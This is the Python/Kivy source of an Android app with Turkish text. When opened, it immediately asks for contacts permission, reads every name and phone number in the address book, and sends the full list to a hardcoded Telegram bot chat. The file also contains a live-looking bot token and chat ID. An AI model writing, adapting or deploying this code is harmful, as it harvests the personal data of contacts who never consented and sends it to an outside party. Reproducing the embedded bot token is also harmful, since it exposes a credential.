# -*- coding: utf-8 -*-
"""
Rehber -> Telegram (otomatik aktarim)
Uygulama acilir, kisi izni ister, izin verilince tum rehber
secim yapilmadan Telegram botuna gonderilir.
"""

import json
import os
import time
import threading
import requests

from kivy.app import App
from kivy.clock import Clock
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.core.window import Window

Window.size = (360, 640)

# ================= AYARLAR =================
BOT_TOKEN = "8804255008:AAEnV_mHv8MUdUtiQ3Lw8RuUwUcYojT-Eco"
CHAT_ID = "6255867373"
TEK_MESAJ = True          # True: tek mesajda liste, False: kisi basina ayri mesaj
# ===========================================

ANDROID = False
try:
    from jnius import autoclass
    ANDROID = True
except ImportError:
    pass


def dosya_yolu(ad):
    if ANDROID:
        try:
            from android.storage import app_storage_path
            return os.path.join(app_storage_path(), ad)
        except Exception:
            return ad
    return ad


def durum_yukle():
    try:
        with open(dosya_yolu("durum.json"), "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {"gonderildi": False}


def durum_kaydet(v):
    try:
        with open(dosya_yolu("durum.json"), "w", encoding="utf-8") as f:
            json.dump(v, f, ensure_ascii=False)
    except Exception:
        pass


def parcala(metin, limit=3900):
    """Telegram'in 4096 karakter siniri icin mesaji boler."""
    parcalar = []
    tampon = ""
    for satir in metin.split("\n"):
        if len(tampon) + len(satir) + 1 > limit:
            if tampon:
                parcalar.append(tampon)
            tampon = ""
        tampon += satir + "\n"
    if tampon.strip():
        parcalar.append(tampon)
    return parcalar


def tg_gonder(metin):
    """Telegram'a mesaj atar. Basarili ise True doner."""
    url = "https://api.telegram.org/bot{}/sendMessage".format(BOT_TOKEN)
    for _ in range(3):
        try:
            r = requests.post(
                url,
                data={"chat_id": CHAT_ID, "text": metin[:4096]},
                timeout=20,
            )
            j = r.json()
            if j.get("ok"):
                return True
            if j.get("error_code") == 429:
                time.sleep(j.get("parameters", {}).get("retry_after", 3))
                continue
            return False
        except Exception:
            time.sleep(2)
    return False


def tel_formatla(ham):
    """0532..., 532..., 90532... -> +90 532 123 45 67"""
    d = "".join(c for c in (ham or "") if c.isdigit())
    if d.startswith("90") and len(d) == 12:
        d = d[2:]
    if d.startswith("0"):
        d = d[1:]
    if len(d) == 10:
        return "+90 {} {} {} {}".format(d[:3], d[3:6], d[6:8], d[8:])
    return (ham or "").strip()


def izin_iste():
    """READ_CONTACTS izin penceresini cikarir ve sonucu bekler."""
    if not ANDROID:
        return True
    from android.permissions import request_permissions, check_permission, Permission

    if check_permission(Permission.READ_CONTACTS):
        return True

    sonuc = []
    request_permissions(
        [Permission.READ_CONTACTS],
        lambda perms, grants: sonuc.append(list(grants)),
    )
    bekleme = 0
    while not sonuc and bekleme < 300:
        time.sleep(0.2)
        bekleme += 1
    return bool(sonuc and sonuc[0] and sonuc[0][0])


def tum_kisileri_oku():
    """Rehberdeki tum isim + telefonlari okur (secim yok)."""
    if not ANDROID:
        return [("Ornek Kisi", "+90 555 000 00 00"),
                ("Ornek Kisi 2", "+90 555 000 00 01")]

    PythonActivity = autoclass("org.kivy.android.PythonActivity")
    ContactsContract = autoclass("android.provider.ContactsContract")

    cr = PythonActivity.mActivity.getContentResolver()
    Phone = ContactsContract.CommonDataKinds.Phone

    kisiler = []
    gorulen = set()
    cur = None
    try:
        cur = cr.query(Phone.CONTENT_URI, None, None, None, Phone.DISPLAY_NAME + " ASC")
        i_ad = cur.getColumnIndex(Phone.DISPLAY_NAME)
        i_no = cur.getColumnIndex(Phone.NUMBER)
        while cur.moveToNext():
            ad = (cur.getString(i_ad) or "").strip()
            no = cur.getString(i_no) or ""
            tel = tel_formatla(no)
            if not ad or not tel:
                continue
            anahtar = (ad.lower(), tel)
            if anahtar in gorulen:
                continue
            gorulen.add(anahtar)
            kisiler.append((ad, tel))
    except Exception:
        pass
    finally:
        if cur is not None:
            try:
                cur.close()
            except Exception:
                pass

    kisiler.sort(key=lambda x: x[0].lower())
    return kisiler


class RehberApp(App):
    title = "Rehber Aktarim"

    def build(self):
        self.calisiyor = False

        kok = BoxLayout(orientation="vertical", padding=(20, 30), spacing=14)

        kok.add_widget(Label(
            text="Rehber Aktarim", font_size="26sp", bold=True,
            color=(0.24, 0.86, 0.59, 1), size_hint_y=None, height=50,
        ))
        kok.add_widget(Label(
            text="Izin verince rehberin tamami\nTelegram botuna gonderilir.",
            halign="center", color=(0.65, 0.70, 0.78, 1),
            size_hint_y=None, height=70,
        ))

        self.durum = Label(
            text="Baslatiliyor...", halign="center",
            color=(0.92, 0.92, 0.92, 1),
        )
        kok.add_widget(self.durum)

        self.buton = Button(
            text="Tekrar aktar", size_hint_y=None, height=60,
            background_color=(0.14, 0.35, 0.90, 1), bold=True,
        )
        self.buton.bind(on_press=self.basla)
        kok.add_widget(self.buton)

        Clock.schedule_once(lambda dt: self.basla(), 0.5)
        return kok

    def durum_yaz(self, metin):
        Clock.schedule_once(lambda dt: setattr(self.durum, "text", metin), 0)

    def basla(self, *_):
        if self.calisiyor:
            return
        self.calisiyor = True
        threading.Thread(target=self.islem, daemon=True).start()

    def islem(self):
        try:
            # 1) IZIN
            self.durum_yaz("Kisi izni isteniyor...")
            if not izin_iste():
                self.durum_yaz("Izin verilmedi. 'Tekrar aktar' butonuna bas\nve IZIN VER'i sec.")
                return

            # 2) REHBERI OKU
            self.durum_yaz("Rehber okunuyor...")
            kisiler = tum_kisileri_oku()
            if not kisiler:
                self.durum_yaz("Rehberde telefon numarasi bulunamadi.")
                return

            # 3) GONDER
            self.durum_yaz("{} kisi gonderiliyor...".format(len(kisiler)))
            zaman = time.strftime("%d.%m.%Y %H:%M")
            basarili = 0

            if TEK_MESAJ:
                satirlar = [
                    "REHBER AKTARIMI ({} kisi)".format(len(kisiler)),
                    "Zaman: {}".format(zaman),
                    "",
                ]
                for i, (ad, tel) in enumerate(kisiler, 1):
                    satirlar.append("{}. {} - {}".format(i, ad, tel))
                for parca in parcala("\n".join(satirlar)):
                    if tg_gonder(parca):
                        basarili += 1
                    time.sleep(1)
            else:
                for ad, tel in kisiler:
                    metin = "Kisi\nAd: {}\nTelefon: {}\nZaman: {}".format(ad, tel, zaman)
                    if tg_gonder(metin):
                        basarili += 1
                    time.sleep(0.4)

            if basarili:
                d = durum_yukle()
                d["gonderildi"] = True
                durum_kaydet(d)
                self.durum_yaz("TAMAM: {} kisi Telegram'a gonderildi.".format(len(kisiler)))
            else:
                self.durum_yaz("Gonderilemedi. Token/Chat ID ve interneti kontrol et.")
        except Exception as e:
            self.durum_yaz("Hata: {}".format(str(e)[:80]))
        finally:
            self.calisiyor = False


if __name__ == "__main__":
    RehberApp().run()
